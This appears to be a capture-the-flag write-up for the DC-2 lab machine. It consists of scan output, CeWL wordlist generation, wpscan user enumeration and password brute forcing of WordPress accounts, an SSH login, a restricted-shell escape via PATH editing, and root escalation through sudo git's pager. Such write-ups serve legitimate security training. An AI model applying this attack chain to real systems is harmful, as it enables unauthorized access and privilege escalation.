# DC-2

```shell
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e/C1hLs6R0CH1fSWfpJ0x45g77ZaEn/nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB/QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1/xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN/aBITwGOIBGrp06w==
|   2048 5911d8af38518f41a744b32803809942 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH/VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf/QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud/SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR/PYR9
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE=
|   256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky/2s+wXTH
```

### Port 80 - Wordpress&#x20;

#### CEWL

```
cewl http://dc-2/ > dc2.txt
cewl http://dc-2/index.php/what-we-do/ >> dc2.txt
cewl http://dc-2/index.php/our-people/ >> dc2.txt
cewl http://dc-2/index.php/our-products/ >> dc2.txt
cewl http://dc-2/index.php/flag/ >> dc2.txt
```

#### wp-scan

```shell
wpscan --url http://dc-2 --enumerate u
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

wpscan --url http://dc-2 -U 'jerry' -p dc2.txt
wpscan --url http://dc-2 -U 'tom' -p dc2.txt
```

### Local.txt

#### Port 7744 - SSH (tom)

```shell
ssh tom@dc-2 -p 7744

tom@DC-2:~$ ls -la
total 44
drwxr-x--- 3 tom  tom  4096 Nov  7 02:17 .
drwxr-xr-x 4 root root 4096 Mar 21  2019 ..
-rwxr-x--- 1 tom  tom   154 Nov  7 02:38 .bash_history
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc
-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt
-rw-r--r-- 1 root root   33 Nov  7 02:17 local.txt
-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile
drwxr-x--- 3 tom  tom  4096 Mar 21  2019 usr

tom@DC-2:~$ ls -la usr/bin
total 8
drwxr-x--- 2 tom tom 4096 Mar 21  2019 .
drwxr-x--- 3 tom tom 4096 Mar 21  2019 ..
lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -> /usr/bin/less
lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -> /bin/ls
lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -> /usr/bin/scp
lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -> /usr/bin/vi
```

### Proof.txt

```shell
vi .bash_profile
export PATH=/usr/bin:/bin:/home/tom/usr/bin
------relogin tom ssh------
tom@DC-2:~$ su jerry

jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

jerry@DC-2:~$ sudo /usr/bin/git -p help config
!/bin/sh

id
uid=0(root) gid=0(root) groups=0(root)

ls -la /root
total 36
drwx------  2 root root 4096 Nov  7 02:17 .
drwxr-xr-x 21 root root 4096 Mar 10  2019 ..
-rw-------  1 root root    6 Mar 29  2022 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  427 Mar 21  2019 final-flag.txt
-rw-------  1 root root   46 Mar 21  2019 .lesshst
-rw-------  1 root root  232 Mar 21  2019 .mysql_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   33 Nov  7 02:17 proof.txt
```
